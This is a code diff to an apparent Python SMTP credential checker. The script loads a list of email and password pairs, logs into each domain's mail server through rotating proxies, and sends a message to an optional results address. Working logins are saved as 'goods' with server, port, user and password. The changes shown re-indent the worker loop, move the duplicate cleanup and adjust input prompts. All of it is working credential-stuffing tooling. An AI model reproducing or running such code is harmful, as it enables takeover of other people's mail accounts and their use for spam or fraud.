@@ -206,7 +206,6 @@ def get_rand_ip_of_host(host):
 			record_type = 'AAAA' if socket.has_ipv6 else 'A'
 			ip_addresses = resolver_obj.resolve(host, record_type)
 			chosen_ip = str(random.choice(ip_addresses))
-			print(f'get ip: {chosen_ip}')
 			return chosen_ip
 	except Exception as e:
 		raise Exception(f'No A record found for {host}: {str(e)}')
@@ -460,7 +459,7 @@ def clean_smtp_entries(filename):
 					file.writelines(domain_dict[domain]['lines'])
 	except Exception as e:
 		print("Error! Can't delete dublicates")
-		return []
+		sys.exit(1)
 
 def get_proxy():
     global current_proxy, request_count
@@ -488,42 +487,42 @@ def requests_get(url, **kwargs):
 	
 	
 def worker_item(jobs_que, results_que, proxies):
-    global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
-    while True:
-        if (mem_usage > 90 or cpu_usage > 90) and threads_counter > min_threads:
-            break
-        if jobs_que.empty():
-            if no_jobs_left:
-                clean_smtp_entries(smtp_filename)
-                break
-            else:
-                results_que.put('queue exhausted, ' + bold('sleeping...'))
-                time.sleep(1)
-                continue
-        else:
-            time_start = time.perf_counter()
-            smtp_server, port = 0, 0
-            smtp_user, password = jobs_que.get()
-            login_template = default_login_template
-            try:
-                results_que.put(f'getting settings for {smtp_user}:{password}')
-                if not smtp_server or not port:
-                    smtp_server_port_arr, login_template = get_smtp_config(smtp_user.split('@')[1])
-                    if len(smtp_server_port_arr):
-                        smtp_server, port = random.choice(smtp_server_port_arr).split(':')
-                    else:
-                        raise Exception('still no connection details for ' + smtp_user)
-                results_que.put(blue('connecting to') + f' {smtp_server}|{port}|{smtp_user}|{password}')
-                smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
-                results_que.put(green(smtp_user + ':\a' + password, 7) + (verify_email and green(' sent to ' + verify_email, 7)))
-                open(smtp_filename, 'a').write(f'{smtp_server},{port},{smtp_user},{password}\n')
-                goods += 1
-            except Exception as e:
-                results_que.put(orange((smtp_server and port and smtp_server + ':' + port + ' - ' or '') + ', '.join(str(e).splitlines()).strip()))
-            time.sleep(0.04)  # unlock other threads a bit
-            loop_times.append(time.perf_counter() - time_start)
-            loop_times.pop(0) if len(loop_times) > min_threads else 0
-    threads_counter -= 1
+		global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
+		while True:
+			if (mem_usage > 90 or cpu_usage > 90) and threads_counter > min_threads:
+				break
+			if jobs_que.empty():
+				if no_jobs_left:
+					break
+				else:
+					results_que.put('queue exhausted, ' + bold('sleeping...'))
+					time.sleep(1)
+					continue
+			else:
+				time_start = time.perf_counter()
+				smtp_server, port = 0, 0
+				smtp_user, password = jobs_que.get()
+				login_template = default_login_template
+				try:
+					results_que.put(f'getting settings for {smtp_user}:{password}')
+					if not smtp_server or not port:
+						smtp_server_port_arr, login_template = get_smtp_config(smtp_user.split('@')[1])
+						if len(smtp_server_port_arr):
+							smtp_server, port = random.choice(smtp_server_port_arr).split(':')
+						else:
+							raise Exception('still no connection details for ' + smtp_user)
+					results_que.put(blue('connecting to') + f' {smtp_server}|{port}|{smtp_user}|{password}')
+					smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
+					results_que.put(green(smtp_user + ':\a' + password, 7) + (verify_email and green(' sent to ' + verify_email, 7)))
+					open(smtp_filename, 'a').write(f'{smtp_server},{port},{smtp_user},{password}\n')
+					goods += 1
+				except Exception as e:
+					results_que.put(orange((smtp_server and port and smtp_server + ':' + port + ' - ' or '') + ', '.join(str(e).splitlines()).strip()))
+				time.sleep(0.04)  # unlock other threads a bit
+				loop_times.append(time.perf_counter() - time_start)
+				loop_times.pop(0) if len(loop_times) > min_threads else 0
+		threads_counter -= 1
+		
 
 
 def every_second():
@@ -586,8 +585,10 @@ try:
 		print(inf+help_message)
 		while not os.path.isfile(list_filename):
 			list_filename = input(npt+'path to file with emails & passwords: ')
-		while not is_valid_email(verify_email) and verify_email != '':
+		if verify_email == '':
 			verify_email = input(npt+'email to send results to (leave empty if none): ')
+			while not is_valid_email(verify_email) and verify_email != '':
+				verify_email = input(npt+'email to send results to (leave empty if none): ')
 		exclude_mail_hosts = input(npt+'ignored email domains, comma separated (leave empty if none): ')
 		exclude_mail_hosts = bad_mail_servers+','+exclude_mail_hosts if exclude_mail_hosts else bad_mail_servers
 		start_from_line = input(npt+'start from line (leave empty to start from 0): ')
@@ -662,4 +663,5 @@ with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
                 break
             time.sleep(0.04)
 time.sleep(1)
+clean_smtp_entries(smtp_filename)
 print('\r\n'+okk+green('well done. bye.',1))
